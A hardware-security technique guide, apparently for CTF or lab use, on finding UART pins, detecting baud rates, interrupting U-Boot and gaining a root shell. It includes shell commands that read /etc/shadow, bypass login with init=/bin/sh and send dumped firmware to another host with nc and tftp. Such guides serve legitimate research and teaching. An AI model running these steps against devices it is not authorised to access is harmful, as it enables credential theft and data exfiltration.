---
title: "UART - Finding TX/RX/GND, Baud Detection and Getting a Shell"
category: hardware
subcategory: uart
type: technique
tags: [uart, serial, tx, rx, gnd, baud-rate, ttl, ftdi, ch340, minicom, picocom, screen, pyserial, uboot, bootloader, console, logic-analyzer, pinout]
difficulty: easy
summary: "Locate the debug serial port on a board, work out the baud rate, attach a USB-TTL adapter and interrupt the bootloader for a root shell."
when_to_use:
  - "A photo or a board shows 3-4 unpopulated through-holes near the SoC"
  - "You have a .sr capture with a suspected UART channel"
  - "The challenge says 'get a shell on the device'"
tools: [picocom, minicom, screen, pyserial, sigrok-cli, multimeter, logic-analyzer]
related: [logic-analyzer-decoding, jtag-swd, firmware-extraction, mcu-reversing]
---

## TL;DR

UART needs three pins: **GND**, **TX** (device talks) and **RX** (device listens).
Find GND with a multimeter continuity test to the shield, find TX as the pin that
idles high at Vcc and shows activity at power-on, then try baud rates until the
boot log is readable. Interrupt the bootloader within the first second and you
usually get either a U-Boot prompt or a root shell.

## Recognise it

- 3, 4 or 5 unpopulated pads/holes in a row, often labelled `TX RX GND VCC`,
  `J1`, `JP1`, `CON2`, or nothing at all.
- Test points near the SoC, sometimes on the underside.
- In a logic capture: one channel idling high, with 10-bit frames (start low,
  8 data, stop high) and bursts at power-on.
- `strings` in the firmware shows `console=ttyS0,115200` or `ttyAMA0`, `ttymxc0`.
- The device tree (`dtc -I dtb`) has a `stdout-path = "serial0:115200n8"`.

## Theory

### Signal and levels

UART is asynchronous, no clock line. Idle is high. A frame is:

```
idle  start   d0  d1  d2  d3  d4  d5  d6  d7   stop   idle
----+      +---+---+---+---+---+---+---+---+ +--------
    |______|  LSB first, sampled mid-bit     |_(high)_
```

Bit time = 1/baud. Default framing is `8N1` (8 data bits, no parity, 1 stop bit).

**Voltage matters.** Embedded UART is TTL level: 3.3 V (most common), 1.8 V (modern
SoCs, phones) or 5 V (old AVR boards). RS-232 (+/-12 V) is a *different* thing -
connecting a PC serial port directly to a 3.3 V pin destroys it. Match your adapter's
VCCIO to the board, and **never connect the adapter's VCC** unless you know the board is
not otherwise powered.

### Wiring

| Adapter | Board |
|---|---|
| GND | GND (common ground is mandatory) |
| RX | TX |
| TX | RX |
| VCC | leave disconnected (board has its own power) |

TX-to-TX is the classic mistake and produces silence.

### Identifying the pins without labels

| Pin | Multimeter (board powered off, diode/continuity mode) | Powered on (DC volts) |
|---|---|---|
| GND | continuity to shield / USB shell / electrolytic cap negative | 0 V |
| VCC | none | steady 3.3 V (or 1.8 / 5) |
| TX | high resistance to GND | idles at Vcc, dips during boot (a meter shows a wobble) |
| RX | pulled high through a resistor (often ~kilo-ohm to Vcc) | steady Vcc, no activity |

With a scope or logic analyser it is unambiguous: **TX is the pin with a burst of
activity in the first seconds after power-on**; RX is quiet until you type.

### Baud detection

If you know the shortest pulse width `t_min` in a capture, `baud ~= 1/t_min`, then round
to the nearest standard rate. Without a capture, brute force in this order:
115200, 57600, 38400, 19200, 9600, 230400, 460800, 921600, 1500000, 74880 (ESP8266 boot),
4800, 2400, 1200.

Wrong baud gives consistent garbage (often the same wrong characters repeatedly);
correct baud gives readable ASCII with newlines.

## Attack

1. Identify GND, TX, RX with a meter; confirm the voltage level.
2. Wire adapter GND-GND, RX-TX, TX-RX. Do not connect VCC.
3. Open a terminal at 115200 8N1 and power-cycle the board.
4. If garbage, sweep the baud list (script below).
5. Read the boot log: bootloader name, kernel args, root device, any password prompt.
6. Interrupt the bootloader: spam a key (or the documented magic string) during the
   "Hit any key to stop autoboot" window.
7. In U-Boot: `printenv`, then set `bootargs` to add `init=/bin/sh` and `boot`.
8. If Linux boots to a login prompt, try vendor defaults, or go back to the bootloader.

## Code

### Connecting

```bash
# which device appeared when you plugged the adapter in
ls -l /dev/serial/by-id/ 2>/dev/null
ls /dev/ttyUSB* /dev/ttyACM* 2>/dev/null          # linux
ls /dev/cu.usbserial-* /dev/cu.usbmodem*          # macos
dmesg | tail -20                                   # driver + device name
lsusb | grep -iE 'ftdi|cp210|ch34|prolific|silicon'

# picocom: the friendliest; ctrl-a ctrl-x to exit
picocom -b 115200 /dev/ttyUSB0
picocom -b 115200 --imap lfcrlf --omap crlf /dev/ttyUSB0   # fix line endings
picocom -b 115200 -f n -p n -d 8 -y n /dev/ttyUSB0         # no flow control, 8N1

# screen: ctrl-a k to kill
screen /dev/ttyUSB0 115200
screen -L -Logfile boot.log /dev/ttyUSB0 115200            # log to a file

# minicom: ctrl-a z for help, ctrl-a x to exit
minicom -D /dev/ttyUSB0 -b 115200
minicom -s                                                  # interactive setup

# raw, scriptable
stty -F /dev/ttyUSB0 115200 cs8 -cstopb -parenb raw -echo
cat /dev/ttyUSB0 | tee boot.log
printf 'help\r' > /dev/ttyUSB0

# macos
screen /dev/cu.usbserial-0001 115200
```

### Automatic baud detection with pyserial

```python
#!/usr/bin/env python3
"""uart_detect.py - sweep baud rates on a serial port and score output printability.

Prints a ranked table; the correct baud rate has a high printable ratio and
plausible line structure. See also scripts/hardware/uart-baud-scanner.md for the
full-featured version.

Usage:
  python3 uart_detect.py /dev/ttyUSB0
  python3 uart_detect.py /dev/ttyUSB0 --seconds 3
"""
from __future__ import annotations

import argparse
import sys

BAUDS = [115200, 57600, 38400, 19200, 9600, 230400, 460800, 921600,
         1500000, 74880, 4800, 2400, 1200]
PRINTABLE = set(range(0x20, 0x7F)) | {0x09, 0x0A, 0x0D}


def score(data: bytes) -> float:
    if not data:
        return 0.0
    good = sum(1 for b in data if b in PRINTABLE)
    ratio = good / len(data)
    # reward newlines: real console output has line structure
    lines = data.count(b"\n")
    bonus = min(0.2, lines / max(1, len(data) / 40) * 0.1)
    return min(1.0, ratio + bonus)


def sweep(port: str, seconds: float) -> list[tuple[int, float, bytes]]:
    import serial  # type: ignore

    results = []
    for baud in BAUDS:
        try:
            with serial.Serial(port, baud, timeout=seconds) as ser:
                ser.reset_input_buffer()
                ser.write(b"\r\n")
                data = ser.read(4096)
        except Exception as exc:                 # noqa: BLE001 - serial raises broadly
            print(f"  {baud:>8}: {exc}", file=sys.stderr)
            continue
        results.append((baud, score(data), data))
        print(f"  {baud:>8}: score={score(data):.2f} bytes={len(data)} "
              f"sample={data[:48]!r}")
    results.sort(key=lambda t: -t[1])
    return results


def main() -> int:
    ap = argparse.ArgumentParser(description="uart baud sweeper")
    ap.add_argument("port")
    ap.add_argument("--seconds", type=float, default=2.0)
    args = ap.parse_args()
    print(f"sweeping {args.port} (power-cycle the board during the sweep)")
    results = sweep(args.port, args.seconds)
    if results:
        baud, sc, data = results[0]
        print(f"\nbest: {baud} baud (score {sc:.2f})")
        print(data.decode("utf-8", "replace")[:600])
    return 0


def _selftest() -> None:
    good = b"U-Boot 2016.05 (Jan 01 2020)\nDRAM: 128 MiB\nHit any key to stop autoboot\n"
    junk = bytes([0xF8, 0x9C, 0xE0, 0x03] * 20)
    assert score(good) > 0.9, score(good)
    assert score(junk) < 0.3, score(junk)
    assert score(b"") == 0.0
    print("selftest ok")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        _selftest()
    else:
        sys.exit(main())
```

### Baud from a logic-analyser capture

```bash
# capture 5 seconds at 1 MHz on channel 0 while the board boots
sigrok-cli -d fx2lafw -c samplerate=1m --time 5s -o boot.sr

# let the decoder guess: try each baud and see which one produces ascii
for B in 115200 57600 38400 19200 9600; do
  echo "== $B"
  sigrok-cli -i boot.sr -P uart:rx=D0:baudrate=$B:format=ascii -A uart=rx-data | head -5
done

# or measure the narrowest pulse and compute it: baud = 1 / t_min
sigrok-cli -i boot.sr -P uart:rx=D0:baudrate=115200 --protocol-decoder-samplenum | head
```

### Interrupting the bootloader

```bash
# have the terminal open BEFORE powering the board, then spam a key
# common interrupt keys/strings:
#   any key            (u-boot default)
#   Ctrl-C             (some vendors)
#   "tpl"              (tp-link)
#   Esc / Space        (redboot, cfe)
#   "4321" / "1234"    (broadcom cfe)

# scripted interrupt: send keys continuously while the board boots
python3 - <<'PY'
import serial, time
s = serial.Serial('/dev/ttyUSB0', 115200, timeout=0.1)
end = time.time() + 15
while time.time() < end:
    s.write(b'\r\n')
    data = s.read(256)
    if data:
        print(data.decode('utf-8', 'replace'), end='')
    if b'=>' in data or b'#' in data or b'U-Boot>' in data:
        print('\n[+] bootloader prompt reached')
        break
PY
```

### Once you have U-Boot

```text
help                      # what this build supports
printenv                  # every variable; note bootargs and bootcmd
printenv bootargs
setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock2 init=/bin/sh'
saveenv                   # optional; persists, may brick if you get it wrong
boot                      # or: run bootcmd

# dump flash over the serial line (slow but reliable)
md.b 0x9f000000 0x100     # memory display, byte-wise
md 0x80000000 0x40        # word-wise
mw 0x80000000 0xdeadbeef  # memory write
sf probe 0                # probe the spi flash
sf read 0x80000000 0 0x800000   # read 8 MiB of flash into RAM
crc32 0x80000000 0x800000       # checksum it
tftpboot 0x80000000 image.bin   # pull a file in over tftp
tftpput 0x80000000 0x800000 dump.bin    # push the RAM contents out over tftp
loady 0x80000000          # receive over ymodem on the serial line
nand read 0x80000000 0 0x800000
bdinfo                    # board info: memory map, clocks
mtdparts                  # partition layout
```

### Once you have a Linux shell

```bash
cat /proc/version /proc/cpuinfo /proc/mtd /proc/partitions
cat /etc/passwd /etc/shadow
ls -la /etc/init.d/
mount                                   # what is writable
dmesg | head -40
cat /proc/mtd                           # partition names and sizes
dd if=/dev/mtd0 of=/tmp/boot.bin        # dump a partition
cat /dev/mtdblock2 > /tmp/rootfs.bin
# exfiltrate over the serial line if there is no network
uuencode /tmp/rootfs.bin rootfs.bin     # then capture the terminal log
base64 /tmp/rootfs.bin                  # and decode on the host
# or bring up networking and use tftp/nc
ifconfig eth0 192.168.1.100 up
tftp -p -l /tmp/rootfs.bin 192.168.1.10
nc 192.168.1.10 4444 < /tmp/rootfs.bin
```

## Variants & pitfalls

- **No output at all** - wrong pin, TX/RX swapped, no common ground, or the UART is
  disabled in the bootloader config. Swap TX/RX first; it is free.
- **Output but garbage at every baud** - the level is 1.8 V and your adapter is 3.3 V
  (marginal), or the framing is not 8N1 (try 7E1, 8E1), or it is inverted (some boards
  use inverted TTL; FTDI can invert in EEPROM, or use `--invert` in software).
- **Readable output but typing does nothing** - RX is not connected, the pin has a
  series resistor you have not bridged, or console input is disabled
  (`console=ttyS0,115200` present but `getty` not started). Check for
  `CONFIG_CMD_*` restrictions in U-Boot.
- **The autoboot delay is 0** - `bootdelay=0`; you must glitch, short a flash data line
  during boot to force a bootloader fallback, or find another entry point.
- **A password prompt in U-Boot** - some vendors add `CONFIG_AUTOBOOT_KEYED` with a magic
  string; it is in the bootloader binary, `strings` it.
- **The shell is a restricted CLI** - try `sh`, `!`, `exec`, command injection in its
  own arguments, or use it to `cat /dev/mtdblock*`.
- **You see the kernel log but no prompt** - `console=` points at this UART but no getty.
  Change `bootargs` to `init=/bin/sh` from the bootloader.
- **Do not connect VCC** while the board is powered by its own supply; back-powering
  browns out or damages parts.
- **1.8 V boards** need a level-shifting adapter or an FT2232H with VCCIO at 1.8 V.

## Tools

- USB-TTL adapters: FT232R/FT2232H (best, supports 1.8 V with the right board),
  CP2102, CH340 (cheapest), PL2303.
- `picocom`, `minicom`, `screen`, `tio`, `pyserial` (`python3 -m serial.tools.miniterm`).
- `sigrok-cli` / PulseView for capture-based baud detection.
- A cheap logic analyser (fx2lafw clone) and a multimeter.
- `pyserial`'s `serial.tools.list_ports` for enumeration in scripts.

## References

- U-Boot documentation on the command set and environment variables.
- sigrok wiki documentation for the `uart` protocol decoder options.
- pyserial documentation for `Serial` timeouts and framing parameters.
